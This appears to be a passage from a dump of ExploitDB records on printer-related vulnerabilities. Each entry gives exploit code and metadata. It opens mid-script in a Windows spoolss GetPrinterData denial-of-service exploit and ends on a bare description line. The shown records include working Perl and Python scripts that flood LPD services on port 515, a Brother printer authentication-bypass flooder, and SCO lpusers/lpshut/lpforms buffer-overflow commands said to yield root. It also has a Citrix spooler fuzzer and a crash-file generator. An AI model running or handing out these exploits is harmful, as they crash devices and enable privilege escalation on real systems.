"\\\\\\\\h07\\x00"\r\nquery[\'client\'] = B2()\r\nquery[\'client\'][\'max\'] = len(client)\r\nquery[\'client\'][\'actual\'] = len(client)\r\nquery[\'client\'][\'str\'] = client.encode(\'utf_16_le\')\r\n\r\nuser = "h07\\x00"\r\nquery[\'user\'] = B2()\r\nquery[\'user\'][\'max\'] = len(user)\r\nquery[\'user\'][\'actual\'] = len(user)\r\nquery[\'user\'][\'str\'] = user.encode(\'utf_16_le\')\r\n\r\ndce.call(query.opnum, query)\r\nraw = dce.recv()\r\nhandle = raw[:20]\r\n\r\nif(handle == ("\\x00" * 20)):\r\n   print "[-] ERR: OpenPrinterEx()"\r\n   if(raw[20:] == "\\x09\\x07\\x00\\x00"):\r\n       print "[-] Return code: Invalid printer name (0x00000709)"\r\n   if(raw[20:] == "\\x05\\x00\\x00\\x00"):\r\n       print "[-] Return code: Access denied (0x00000005)"\r\n   exit()\r\n\r\nquery = GetPrinterData()\r\nvalue = "blah_blah\\x00"\r\nquery[\'handle\'] = handle\r\nquery[\'value\'] = B2()\r\nquery[\'value\'][\'max\'] = len(value)\r\nquery[\'value\'][\'actual\'] = len(value)\r\nquery[\'value\'][\'str\'] = value.encode(\'utf_16_le\')\r\nquery[\'offered\'] = memory_size\r\n\r\ndce.call(query.opnum, query)\r\n\r\ntry:\r\n   raw = dce.recv()\r\n   status = raw[:4]\r\n   r_size = raw[4:8]\r\n\r\n   if(status == "\\x1b\\x00\\x00\\x1c"):\r\n       print "[-] Memory allocation error, out of memory"\r\n       exit()\r\n   if(r_size == pack("<L", memory_size)):\r\n       print "[+] Memory allocated"\r\n\r\nexcept NetBIOSTimeout, err:\r\n   print "[+] %s" % (err)\r\n   print "[+] %s: Out of memory" % (host)\r\n\r\nprint "[+] Done"\r\n\r\n# EoF\r\n\r\n# milw0rm.com [2006-12-01]', u'description': u'Microsoft Windows - spoolss GetPrinterData() Remote Denial of Service', u'platform': u'windows', u'author': u'h07', u'cve': [], u'source': u'ExploitDB', u'date': u'2006-12-01T00:00:00+00:00', u'_id': 2879, u'type': u'dos', u'port': 0}

CVE: []
Description: HP JetDirect J3111A - Invalid FTP Command Denial of Service
{u'code': u'source: http://www.securityfocus.com/bid/1491/info\r\n\r\nHP JetDirect firmware is vulnerable to a Denial of Service attack. JetDirect devices have an FTP service which fails to properly handle bad FTP commands sent with the ftp "quote" command. This causes the device to stop responding and possibly display an error message. Powering the device off and on is required to regain normal functionality. \r\n\r\nftp <printer address>\r\nquote AAAAAAAAAAA', u'description': u'HP JetDirect J3111A - Invalid FTP Command Denial of Service', u'platform': u'hardware', u'author': u'Peter Grundl', u'cve': [], u'source': u'ExploitDB', u'date': u'2000-07-19T00:00:00+00:00', u'_id': 20090, u'type': u'dos', u'port': 0}

CVE: []
Description: SCO Open Server 5.0.6 - lpusers Buffer Overflow
{u'code': u'source: http://www.securityfocus.com/bid/2557/info\r\n\r\nSCO OpenServer 5.0.6 (and possibly earlier versions) ships with several suid bin executables used in printer administration and related tasks.\r\n\r\nThis includes lpusers, a component used to set the queue priority of jobs submitted to the LP print service by users.\r\n\'lpusers\' contains a locally exploitable buffer overflow vulnerability that occurs when commandline arguments are of excessive length.\r\n\r\nIf properly exploited, this can yield root privilege to the attacker.\r\n\r\n/opt/K/SCO/Unix/5.0.6Ga/usr/lib/lpusers -u `perl -e \'print "A" x 700\'`\r\n\r\nMemory fault - core dumped', u'description': u'SCO Open Server 5.0.6 - lpusers Buffer Overflow', u'platform': u'sco', u'author': u'Secure Network Operations', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-03-27T00:00:00+00:00', u'_id': 20739, u'type': u'dos', u'port': 0}

CVE: []
Description: SCO Open Server 5.0.6 - lpshut Buffer Overflow
{u'code': u'source: http://www.securityfocus.com/bid/2555/info\r\n\r\n\r\nSCO OpenServer 5.0.6 (and possibly earlier versions) ships with several suid bin executables used in printer administration and related tasks.\r\n\r\nThis includes lpshut, a component used to shut down the LP print service. \'lpshut\' contains a locally exploitable bufffer overflow due to a lack of bounds checking during operations performed on user-supplied data.\r\n\r\nAn attacker may exploit this vulnerability to execute arbitrary code with effective userid \'bin\' privileges. \r\n\r\n/opt/K/SCO/Unix/5.0.6Ga/usr/lib/lpshut `perl -e \'print "A" x 7000\'`\r\n\r\nMemory fault - core dumped', u'description': u'SCO Open Server 5.0.6 - lpshut Buffer Overflow', u'platform': u'sco', u'author': u'Secure Network Operations', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-03-27T00:00:00+00:00', u'_id': 20737, u'type': u'dos', u'port': 0}

CVE: []
Description: Brother HL-5370DW - series Authentication Bypass printer flooder
{u'code': u'# Exploit Title: Brother HL-5370DW series auth bypass printer flooder\r\n# Google Dork: Copyright(C) 2000-2009 Brother Industries, Ltd. All Rights Reserved. Brother HL-5370DW series\r\n# Date: 31/05/2011\r\n# Author: chrisB\r\n# Contact : chrisb [@) gmx.fr\r\n# Version: Brother HL-5370DW series\r\n\r\n#!/usr/bin/perl\r\nuse LWP::Simple;\r\n\r\nusage() unless $ARGV[1];\r\n\r\n$replace = \'post/panel.html?EXECUTE2=PRTCONFIG\';\r\n$hint = $ARGV[1];\r\n$goodurl = $ARGV[0];\r\n$success = 0;\r\n$goodurl =~ s/main.html/$replace/; \r\n\r\n for ($count = $hint + 1; $count >= 1; $count--) {\r\n \t\t$contents = get($goodurl);\r\n\r\n\tif($contents =~ m/acknowledged/i) \r\n\t{\r\n\t\t$success++;\r\n\t\tprint "success\\n";\r\n\t} \r\n\telse \r\n\t{\r\n\t\tprint "error, busy or no more paper\\n";\r\n\t}\r\n }\r\n print "pages printed : $success \\r\\n"; \r\n\t\r\nsub usage \r\n{\r\n print qq( Brother HL-5370DW series auth bypass printer flooder\r\n       \r\nUsage: perl $0 [http://url.fr/printer/main.html] [hints]\r\n                  \r\n)   and exit;\r\n}', u'description': u'Brother HL-5370DW - series Authentication Bypass printer flooder', u'platform': u'hardware', u'author': u'chrisB', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-05-31T00:00:00+00:00', u'_id': 17353, u'type': u'dos', u'port': 0}

CVE: []
Description: XLPD 3.0 - Remote Denial of Service
{u'code': u'#######################################################################\r\n#############\r\n\r\nApplication: XLPD 3.0 Remote DoS\r\n\r\nPlatforms: Windows XP Professional SP2\r\n\r\ncrash:\t YES\r\n\r\nExploitation: remote DoS\r\n\r\nDate: 2009-10-06\r\n\r\nAuthor: Francis Provencher (Protek Research Lab\'s)\r\n\r\n########################################################################\r\n#############\r\n\r\n1) Introduction\r\n2) Technical details\r\n3) The Code\r\n\r\n########################################################################\r\n#############\r\n\r\n===============\r\n1) Introduction\r\n===============\r\n\r\nXlpd is an LPD (Line Printer Daemon) application for MS Windows platforms. When applying Xlpd, your local PC with a printer becomes a print server where the\r\n\r\nprint jobs from various remote systems are requested and processed in networked environment.\r\n\r\nXlpd helps you print remote files locally without manually downloading them into your local computer. When you are connected to a remote UNIX/Linux system\r\n\r\nwith Xmanager or Xshell program and want to print some data of the remote system, just enter print command on the terminal prompt.\r\n\r\n(www.netsarang.com)\r\n\r\n########################################################################\r\n#############\r\n\r\n============================\r\n2) Technical details \r\n============================\r\n\r\nXlpd 3.0 \r\nBuild 0076\r\nAug 30, 2009\r\n\r\n(774.d80): Access violation - code c0000005 (first chance)\r\nFirst chance exceptions are reported before any exception handling.\r\nThis exception may be expected and handled.\r\neax=00000000 ebx=0012f77c ecx=fffff703 edx=000004fc esi=ffffffff edi=01390000\r\neip=004031c5 esp=0138f468 ebp=00ff8ce0 iopl=0 nv up ei pl nz na pe nc\r\ncs=001b ss=0023 ds=0023 es=0023 fs=0038 gs=0000 efl=00010206\r\n\r\n########################################################################\r\n#############\r\n\r\n===========\r\n3) The Code\r\n===========\r\n\r\nProof of concept DoS code;\r\n\r\n#!/usr/bin/perl\r\n\r\n########################################################################\r\n###########\r\n#\r\n# Software: XLPD 3.0 Remote DoS\r\n# Found By: Francis Provencher (Protek Research Lab\'s)\r\n# Tested On: Windows XPSP2\r\n# Usage: perl scriptname <Target IP>\r\n#\r\n########################################################################\r\n###########\r\n\r\nuse Getopt::Std;\r\nuse Socket;\r\nmy $SOCKET = "";\r\n\r\n$loop = 51;\r\n$host = $ARGV[0];\r\n$port = 515;\r\n\r\nif (!defined $host){\r\nprint "Host not defined.\\n"\r\n}\r\n\r\n$str = "\\x41" x 100000;\r\n\r\n$iaddr = inet_aton($host) || die "Unknown host: $host\\n";\r\n$paddr = sockaddr_in($port, $iaddr) || die "getprotobyname: $!\\n";\r\n$proto = getprotobyname(\'tcp\') || die "getprotobyname: $!\\n";\r\n\r\nfor ($j=1;$j<$loop;$j++) {\r\n\r\nsocket(SOCKET,PF_INET,SOCK_STREAM, $proto) || die "socket: $!\\n";\r\nconnect(SOCKET,$paddr) || die "Lost Conection: $! .........bye bye?\\n";\r\nsend(SOCKET,$str, 0) || die "failure sent: $!\\n";\r\nprint "\\nSending string: ".$j;\r\nsleep(1);\r\nclose SOCKET;\r\nsleep(1);\r\n}\r\n\r\n########################################################################\r\n#############\r\n(PRL-2009-10)', u'description': u'XLPD 3.0 - Remote Denial of Service', u'platform': u'windows', u'author': u'Francis Provencher', u'cve': [], u'source': u'ExploitDB', u'date': u'2009-10-06T00:00:00+00:00', u'_id': 10091, u'type': u'dos', u'port': 515}

CVE: []
Description: Microsoft Windows Kernel - Use-After-Free with Printer Device Contexts (MS15-097)
{u'code': u'Source: https://code.google.com/p/google-security-research/issues/detail?id=433\r\n\r\n---\r\nThe attached PoC demonstrates a UAF condition with printer device contexts. The PoC will trigger on Win 7 32-bit with Special Pool enabled.\r\n---\r\n\r\nProof of Concept:\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/38279.zip', u'description': u'Microsoft Windows Kernel - Use-After-Free with Printer Device Contexts (MS15-097)', u'platform': u'windows_x86', u'author': u'Nils Sommer', u'cve': [], u'source': u'ExploitDB', u'date': u'2015-09-22T00:00:00+00:00', u'_id': 38279, u'type': u'dos', u'port': 0}

CVE: []
Description: Citrix Metaframe Presentation Server Print Provider - Buffer Overflow (PoC)
{u'code': u'/*\r\n Proof of concept exploit for ZDI - Citrix Metaframe spooler service vulnerability\r\n Microsoft Windows - EnumPrinter() & EnumPrinterW() Fuzzer v0.1 \r\n Author: Andres Tarasco Acu\xf1a - atarasco@514.es\r\n url: http://www.514.es\r\n\r\n This is an intial version of EnumPrinter() and OpenPrinter() fuzzer. I hope that \r\n it will help to identify similar vulnerabilities.\r\n Tested against win2k3 + Citrix presentation server. If the system is vulnerable \r\n this application will kill spooler service (spoolsv.exe ) and ret will be overwritten\r\n with 0x00410041\r\n \r\n 514 Tiger Team ownz u\r\n\r\n */\r\n#include <stdio.h>\r\n#include <windows.h>\r\n#include <Winspool.h>\r\n#pragma comment(lib,"Winspool.lib")\r\n\r\n\r\nvoid usage(char *name) {\r\n      printf("Usage: %s -a (Ascii fuzzing for local printer providers)\\n",name);\r\n      printf("Usage: %s -u (Unicode fuzzing for local printer providers)\\n",name);\r\n      exit(0);\r\n}\r\n\r\n#define RECURSIVE 1\r\n#define OPT_UNICODE 2\r\n#define MAX_PRINTER_LEN 4096\r\n\r\n#define _DBG_\r\n#undef _DBG_\r\n\r\nint CustomFuzzSize[]= {25,50,100,150,250,300,500,1000,1500, 2000};\r\nwchar_t dst[MAX_PRINTER_LEN];\r\n\r\n\r\n\r\nvoid Fuzzer( wchar_t *orig,int opt, int unicode) {\r\n   int i,j;\r\n   int len;\r\n\r\n   if (unicode) len=wcslen(orig); \r\n   else len=strlen((char *)orig);\r\n   memset((char *)dst,\'\\0\',sizeof(dst));\r\n   memcpy((char *)dst,orig,len*(1+unicode));\r\n   j=wcslen(orig);\r\n   for(i=0;i<CustomFuzzSize[opt];i++) {\r\n      if (unicode) dst[j+i]=\'A\';\r\n      else ((char *)dst)[j+i]=(char)\'A\';\r\n   }\r\n\r\n   if (opt==0) {\r\n   if (unicode)\r\n   printf("Fuzzing: %S ( %i -%i)\\n",dst,CustomFuzzSize[0],CustomFuzzSize[sizeof(CustomFuzzSize)/sizeof(int)-1]);\r\n   else printf("Fuzzing: %s ( %i -%i)\\n",dst,CustomFuzzSize[0],CustomFuzzSize[sizeof(CustomFuzzSize)/sizeof(int)-1]);\r\n   }\r\n   \r\n}\r\n\r\n\r\nDWORD ShowPrinterInfo(wchar_t *lpName,  int level, int opt, char *padding) {\r\n\r\n   unsigned char *lpInfo;\r\n   int i,j;\r\n   DWORD n;\r\n   DWORD dwSizeNeeded=0;\r\n   char newpadding[50];\r\n\r\n   DWORD ret;\r\n\r\n   if (opt & OPT_UNICODE) {\r\n      EnumPrintersW ( PRINTER_ENUM_NAME, (wchar_t* )lpName, level, NULL, 0, &dwSizeNeeded, &n );\r\n   } else {\r\n      EnumPrintersA ( PRINTER_ENUM_NAME, (char *)lpName, level, NULL, 0, &dwSizeNeeded, &n );\r\n   }\r\n   if (dwSizeNeeded==0) {    \r\n#ifdef _DBG_\r\n      printf ( "EnumPrintersX() Invalid. Error: %d \\n",GetLastError() );\r\n#endif\r\n      return(-1);\r\n   }\r\n\r\n   lpInfo = (void *)HeapAlloc ( GetProcessHeap (), HEAP_ZERO_MEMORY, dwSizeNeeded );\r\n\r\n   if ( lpInfo != NULL ) {\r\n         if (opt & OPT_UNICODE) {\r\n            ret=EnumPrintersW ( PRINTER_ENUM_NAME,(wchar_t *)lpName,level,(LPBYTE)lpInfo,dwSizeNeeded,&dwSizeNeeded,&n);\r\n         } else {\r\n            ret=EnumPrintersA ( PRINTER_ENUM_NAME,(char *)lpName,level,(LPBYTE)lpInfo,dwSizeNeeded,&dwSizeNeeded,&n);\r\n         }\r\n      if (  ret== 0 )\r\n\t   {\r\n#ifdef _DBG_\r\n\t\t   printf ( "EnumPrintersX() Failed. Error: %d ( %i)\\n",GetLastError(),dwSizeNeeded  );\r\n#endif\r\n         HeapFree ( GetProcessHeap (), 0, lpInfo );\r\n\t\t   return 0;\r\n      } else {\r\n         PRINTER_INFO_1 *dataI;\r\n         PRINTER_INFO_2 *dataII;\r\n         \r\n\t      for ( i=0; i < n; i++ ) {\r\n               dataI=(PRINTER_INFO_1*)lpInfo;\r\n             \r\n               printf("%s",padding);\r\n               if (opt & OPT_UNICODE) {\r\n                  if (dataI[i].pName)  printf(" %S - ",(dataI[i].pName));\r\n                  if (dataI[i].pDescription)  printf(" %S ",(dataI[i].pDescription));\r\n                  //if (dataI[i].pComment)  printf(" %S - ",(dataI[i].pComment));\r\n               } else {\r\n                  if (dataI[i].pName)  printf(" %s - ",(dataI[i].pName));\r\n                  if (dataI[i].pDescription)  printf(" %s ",(dataI[i].pDescription));\r\n                  //if (dataI[i].pComment)  printf(" %s - ",(dataI[i].pComment));\r\n               }\r\n                  printf("\\n");\r\n              for(j=0;j<sizeof(CustomFuzzSize)/sizeof(int);j++) {\r\n                 if (opt & OPT_UNICODE) {\r\n                    Fuzzer( (wchar_t *) dataI[0].pName, j,opt & OPT_UNICODE);\r\n                    ShowPrinterInfo((wchar_t*)dst,level, OPT_UNICODE, newpadding);            \r\n                 } else {\r\n                    Fuzzer( (wchar_t *) dataI[0].pName, j,opt & OPT_UNICODE);\r\n                     ShowPrinterInfo((wchar_t*)dst,level, 0, newpadding);            \r\n                 }\r\n               }\r\n               if (opt & RECURSIVE ) {\r\n                  strcpy (newpadding,padding);\r\n                  strcat(newpadding,"---");\r\n                  newpadding[1]=\'+\';\r\n                  ShowPrinterInfo(dataI[i].pName,level, opt, newpadding);\r\n               }\r\n               printf("\\n");\r\n         }\r\n         HeapFree ( GetProcessHeap (), 0, lpInfo );\r\n      }\r\n   }\r\n\r\n   return(1);\r\n}\r\n\r\nint testPrinters(void) {\r\n   DWORD size,ret,err;\r\n   ret=EnumPrintersW ( PRINTER_ENUM_NAME, NULL, 1, NULL, 0, &size, &size );\r\n      if (  ret==0 ) {\r\n         err=GetLastError();\r\n         if (err!=122) { //size error\r\n            printf("[-] Printer Service not available - Error: %d\\n",err );         \r\n            exit(-1);\r\n         }\r\n      } \r\n      return(1);\r\n}\r\nint main ( int argc, char *argv[] )\r\n{\r\n\r\n   printf("[+] Citrix Presentation Server - Local EnumPrinterW() POC exploit\\n");\r\n   printf("[+] Discovered by ZDI - http://secunia.com/advisories/23869/\\n");\r\n   printf("[+] Proof of concept by Andres Tarasco - atarasco@514.es\\n\\n");\r\n\r\n   if (argc!=2) usage(argv[0]);\r\n\r\n   testPrinters();\r\n   printf("[+] Printer Service Seems to be working.. Fuzzing\\n");\r\n \r\n   if ( (argv[1][1]==\'u\'))  { \r\n      ShowPrinterInfo(NULL,1,3,"[*]");\r\n      testPrinters();\r\n   }\r\n   if ( (argv[1][1]==\'a\'))  {\r\n      ShowPrinterInfo(NULL,1,1,"[*]");\r\n      testPrinters();\r\n   }\r\n   \r\n\r\n   return(0);\r\n } \r\n\r\n// milw0rm.com [2007-01-26]', u'description': u'Citrix Metaframe Presentation Server Print Provider - Buffer Overflow (PoC)', u'platform': u'windows', u'author': u'Andres Tarasco', u'cve': [], u'source': u'ExploitDB', u'date': u'2007-01-26T00:00:00+00:00', u'_id': 3204, u'type': u'dos', u'port': 0}

CVE: []
Description: Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (2)
{u'code': u'source: http://www.securityfocus.com/bid/5556/info\r\n \r\nMicrosoft Windows operating systems use the Server Message Block (SMB) protocol to support services such as file and printer sharing. A buffer overflow vulnerability has been reporting in the handling of some malformed SMB requests.\r\n \r\nAn attacker may send a malformed SMB request packet in order to exploit this condition. It has been reported possible to corrupt heap memory, leading to a crash of the underlying system.\r\n \r\nIt may prove possible to exploit this vulnerability to execute arbitrary code and gain local access to the vulnerable system. This possibility has not, however, been confirmed.\r\n \r\nReportedly, this vulnerability may be exploited both as an authenticated user, and with anonymous access to the service.\r\n \r\nIt has been reported, by "Fabio Pietrosanti \\(naif\\)" <naif@blackhats.it>, that disabling the NetBIOS Null Session will prevent exploitation of this vulnerablity. \r\n\r\nhttps://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/21747.zip', u'description': u'Microsoft Windows XP/2000/NT 4.0 - Network Share Provider SMB Request Buffer Overflow (2)', u'platform': u'windows', u'author': u'zamolx3', u'cve': [], u'source': u'ExploitDB', u'date': u'2002-08-22T00:00:00+00:00', u'_id': 21747, u'type': u'dos', u'port': 0}

CVE: []
Description: SCO Open Server 5.0.6 - lpforms Buffer Overflow
{u'code': u'source: http://www.securityfocus.com/bid/2554/info\r\n\r\nSCO OpenServer 5.0.6 (and possibly earlier versions) ships with several suid bin executables used in printer administration and related tasks.\r\n\r\nThis includes lpforms, a component used to manage and configure print destinations, devices and printer interface programs.\r\n\r\n\'lpforms\' contains a locally exploitable buffer overflow vulnerability. If a command line parameter argument is of excessive length, a stack overflow condition will occur.\r\n\r\nAn attacker may exploit this vulnerability execute arbitrary code with effective user \'bin\' privileges. \r\n\r\n/opt/K/SCO/Unix/5.0.6Ga/usr/lib/lpforms `perl -e \'print "A" x 7000\'`\r\n\r\nMemory fault - core dumped', u'description': u'SCO Open Server 5.0.6 - lpforms Buffer Overflow', u'platform': u'sco', u'author': u'Secure Network Operations', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-03-27T00:00:00+00:00', u'_id': 20736, u'type': u'dos', u'port': 0}

CVE: []
Description: Xerox WorkCentre (Multiple Models) - Denial of Service
{u'code': u'#           Louhi Networks Information Security Research\r\n#                        Security Advisory\r\n# \r\n# \r\n#      Advisory: Xerox WorkCentre multiple models Denial of Service\r\n#  Release Date: 2009/08/25\r\n# Last Modified: 2009/08/25\r\n#       Authors: Juho Ranta\r\n#                [juho.ranta@louhi.fi]\r\n#                Henri Lindberg, CISA\r\n#                [henri.lindberg@louhi.fi]\r\n# \r\n#   Application: Xerox WorkCentre\r\n#      Verified: Controller+PS ROM Version 1.202.1 and 1.202.5\r\n#       Devices: Xerox WorkCentre 7132,\r\n# \t       WC7232/7242, WC7328/7335/7345/7346 and\r\n#                WC7425/28/35\r\n#   Attack type: Denial of Service\r\n#          Risk: Low\r\n# Vendor Status: Patch available for WC7232/7242\r\n#    References: http://www.louhinetworks.fi/advisory/xerox_0908.txt\r\n# \r\n# http://www.cert.fi/haavoittuvuudet/2009/haavoittuvuus-2009-081.html\r\n# \r\n# http://www.support.xerox.com/go/results.asp?Xtype=download&prodID=WC7232_WC7242&Xlang=en_US&Xcntry=USA\r\n# \r\n# \r\n# Overview\r\n# \r\n#    Quote from http://www.xerox.com/\r\n#    "The Xerox WorkCentre 7132 multifunction is the affordable transition\r\n#     to the next level of productivity for your office. One easy-to-use\r\n#     device offers powerful printing, copying, scanning, and faxing. The\r\n#     WorkCentre 7132 also gives you color when you need it, for critical\r\n#     documents and for added impact. Robust functions, straightforward\r\n#     operation, and color within your budget . that should keep everyone\r\n#     smiling and productive."\r\n# \r\n#     During a brief assessment performed for Xerox WorkCentre 7132 it was\r\n#     discovered that LPD daemon implementation contains a weakness\r\n#     related  to robustness of LPD protocol handling. Attacker can crash\r\n#     the whole device with a relatively simple attack. Recovering from\r\n#     the denial-of-service condition requires power cycling the device.\r\n# \r\n# Details\r\n# \r\n#     Device freezes when it is flooded with LPD requests having oversized\r\n#     queue name length AND other features of the device are accessed\r\n#     during the attack.\r\n# \r\n#     The LPD daemon terminates the connection when it receives a request\r\n#     with an oversized queue name. The required minimum length for this\r\n#     seems to vary. Our proof-of-concept attack sends ASCII character\r\n#     blocks to the LPD daemon until connection is closed, while sending\r\n#     HTTP requests to the web administration interface.\r\n# \r\n#     By flooding the device with these invalid LPD requests and accessing\r\n#     other features at the same time, the device can be crashed. This was\r\n#     verified with two different firmware versions (1.202.1 and 1.202.5).\r\n# \r\n#     It must be noted that successful denial-of-service attack requires\r\n#     the steps described above. Sending requests with oversized queue\r\n#     names does crash the device by itself.\r\n# \r\n#     Due to the black box nature of the performed attack against a\r\n#     production device, we were not able to determine the exact root\r\n#     cause for the crash. According to vendor this is caused by a memory\r\n#     leak, but further exploitability or memory corruption has neither\r\n#     been confirmed nor denied.\r\n# \r\n#     Vulnerability was detected with an LPD protocol implementation\r\n#     written for Sulley Fuzzing Framework.\r\n# \r\n# \r\n# Preconditions\r\n# \r\n#     *LPD daemon is enabled.\r\n#     *Attacker has network access to the LPD daemon\r\n#     *Attacker has network access to other features OR\r\n#     *Valid user uses the device on location\r\n# \r\n# \r\n# Symptoms of successful attack\r\n# \r\n#     One or more of the following:\r\n#      *Control panel lights are blinking, no response to pushing buttons\r\n#      *LCD panel displays error message\r\n#      *LCD panel displays a halted progress bar\r\n#      *Switching power off from on/off button takes more than 10 seconds\r\n# \r\n# Proof of Concept:\r\n# \r\n#     Python code available at:\r\n#     http://www.louhinetworks.fi/advisory/xerox/exploit.py\r\n#     http://www.louhinetworks.fi/advisory/xerox/webInterface.py\r\n# \r\n#     Pictures of a crashed control panel (Finnish language):\r\n#     http://www.louhinetworks.fi/advisory/xerox/error1.jpg\r\n#     http://www.louhinetworks.fi/advisory/xerox/freeze1.jpg\r\n# \r\n#     Web interface requests are performed with a separate Python\r\n#     process/script in order to achieve more reliable exploitation under\r\n#     Windows.\r\n# \r\n# Mitigation:\r\n# \r\n#     Preventive\r\n#      *Install patch from vendor\r\n#      *Configure IPS signature for LPD requests with oversized queue\r\n#       names\r\n#      *Allow only trusted users to access LPD daemon\r\n#      *Disable LPD daemon\r\n# \r\n#     Detective\r\n#      *Configure IDS signature for LPD requests with oversized queue\r\n#       names\r\n# \r\n# Disclosure Timeline (selected dates):\r\n# \r\n#        X         2008    - Vulnerability discovered\r\n#    3.  September 2008    - Contacted CERT-FI by email describing the\r\n#                            issue with Xerox WC 7132\r\n#    20. November  2008    - CERT-FI confirms vendor has been notified\r\n#    21. January   2009    - Vendor is unable to reproduce the issue,\r\n#                            but continues trying\r\n#    22. January   2009    - Vulnerability reproduced, vendor investigates\r\n#                            other devices. Apologizes slow response.\r\n#    17. June      2009    - Vendor has identified vulnerable devices,\r\n#                            patch due in July.\r\n#    20. August    2009    - Patch available for download (only\r\n#                            WC7232/7242)\r\n#    25. August    2009    - Advisory released\r\n# \r\n# A Big Thank You to CERT-FI\'s Vulnerability Coordination for persistent\r\n# coordination effort.\r\n# \r\n# Copyright 2009 Louhi Networks Oy. All rights reserved. No warranties,\r\n# no liabilities, information provided \'as is\' for educational purposes.\r\n# Reproduction allowed as long as credit is given. Information wants to\r\n# be free.\r\n\r\nimport socket\r\nimport sys\r\nimport os\r\nimport httplib\r\nimport signal\r\n\r\nif len(sys.argv) < 2:\r\n    print("Usage: python exploit.py printerIpAddress")\r\n    print("After the script is started, execute the webInterface.py script")\r\n    sys.exit(0)\r\n\r\nipAddress = sys.argv[1]\r\n\r\n\r\ni = 0\r\n\r\nwhile True:\r\n    i += 1\r\n    try:\r\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        s.connect((ipAddress, 515))\r\n\r\n    except:\r\n        # If the connection fails, printer has crashed\r\n        print("Unable to connect")\r\n        sys.exit(0)\r\n\r\n    # Send receive a printer job -command. Queue name will be as long as\r\n    # possible. The printer will disconnect when the queue name has reached it\'s\r\n    # maximum length\r\n    s.send("\\x02")\r\n    j = 0\r\n    while True:\r\n        j += 1\r\n        s.send("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")\r\n        print(str(i) + "." + str(j))\r\n        \r\n    s.close()\r\n\r\n    print(i)\r\n\r\n# milw0rm.com [2009-08-25]', u'description': u'Xerox WorkCentre (Multiple Models) - Denial of Service', u'platform': u'hardware', u'author': u'Henri Lindberg', u'cve': [], u'source': u'ExploitDB', u'date': u'2009-08-25T00:00:00+00:00', u'_id': 9514, u'type': u'dos', u'port': 0}

CVE: []
Description: eXPert PDF Reader 4.0 - Null Pointer Dereference and Heap Corruption
{u'code': u'#!/usr/local/bin/perl\r\n#\r\n#\r\n# eXPert PDF Reader 4.0 NULL Pointer Dereference and Heap Corruption Denial Of Service\r\n#\r\n#\r\n# Vendor: Visagesoft\r\n# Product web page: http://www.visagesoft.com\r\n# Affected version: 4.0.210\r\n#\r\n# Summary: eXPert PDF Reader is a free pdf viewer software that lets you view and print\r\n# pdf documents on windows operating systems.\r\n#\r\n# Desc: The vulnerability is caused due to a NULL pointer dereference when processing\r\n# malicious Printer Job (.pj) files and can be exploited to crash the application and\r\n# cause a heap corruption and denial of service scenarios.\r\n#\r\n# Tested on: Microsoft Windows XP Professional SP3 (EN)\r\n#\r\n# ----------------------------------------------------------------------------------\r\n#\r\n# HEAP[vspdfreader.exe]: Invalid allocation size - 82828290 (exceeded 7ffdefff)\r\n# (77c.d48): Unknown exception - code 0eedfade (first chance)\r\n# (77c.d48): Access violation - code c0000005 (first chance)\r\n# First chance exceptions are reported before any exception handling.\r\n# This exception may be expected and handled.\r\n# eax=00000001 ebx=02d7a188 ecx=00bd311c edx=00000002 esi=00000002 edi=0012fe24\r\n# eip=00446cc9 esp=0012fb6c ebp=0012fb84 iopl=0         nv up ei ng nz ac pe cy\r\n# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210297\r\n# *** WARNING: Unable to verify checksum for image00400000\r\n# *** ERROR: Module load completed but symbols could not be loaded for image00400000\r\n# image00400000+0x46cc9:\r\n# 00446cc9 8b04b0          mov     eax,dword ptr [eax+esi*4] ds:0023:00000009=????????\r\n#\r\n# image00400000+0x46cc9:\r\n# 00446cc9 8b04b0          mov     eax,dword ptr [eax+esi*4]\r\n# 00446ccc 5e              pop     esi\r\n# 00446ccd 5b              pop     ebx\r\n# 00446cce c3              ret\r\n# 00446ccf 90              nop\r\n# 00446cd0 8bc8            mov     ecx,eax\r\n# 00446cd2 b201            mov     dl,1\r\n# 00446cd4 a1f48d4300      mov     eax,dword ptr [image00400000+0x38df4 (00438df4)]\r\n#\r\n# image00400000+0x38df4:\r\n# 00438df4 4c              dec     esp\r\n# 00438df5 8e4300          mov     es,word ptr [ebx]\r\n# 00438df8 0000            add     byte ptr [eax],al\r\n# 00438dfa 0000            add     byte ptr [eax],al\r\n# 00438dfc 0000            add     byte ptr [eax],al\r\n# 00438dfe 0000            add     byte ptr [eax],al\r\n# 00438e00 0000            add     byte ptr [eax],al\r\n# 00438e02 0000            add     byte ptr [eax],al\r\n#\r\n# ----------------------------------------------------------------------------------\r\n#\r\n# Vulnerability discovered by: Gjoko \'LiquidWorm\' Krstic\r\n# liquidworm gmail com\r\n# Zero Science Lab - http://www.zeroscience.mk\r\n#\r\n# Advisory ID: ZSL-2011-5000\r\n# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5000.php\r\n#\r\n#\r\n# 25.02.2011\r\n#\r\n\r\nmy $file = "dniz0r.pj";\r\nmy $data = ""; #my $data = "J" x(2+2);\r\nopen($FILE,">$file");\r\nprint $FILE $data;\r\nclose($FILE);\r\nprint "\\npj File Created successfully\\n";', u'description': u'eXPert PDF Reader 4.0 - Null Pointer Dereference and Heap Corruption', u'platform': u'windows', u'author': u'LiquidWorm', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-02-26T00:00:00+00:00', u'_id': 16248, u'type': u'dos', u'port': 0}

CVE: []
Description: Microsoft Windows - 'gdi32.dll' Heap Buffer Overflow in ExtEscape() Triggerable via EMR_EXTESCAPE EMF Record (MS16-055)
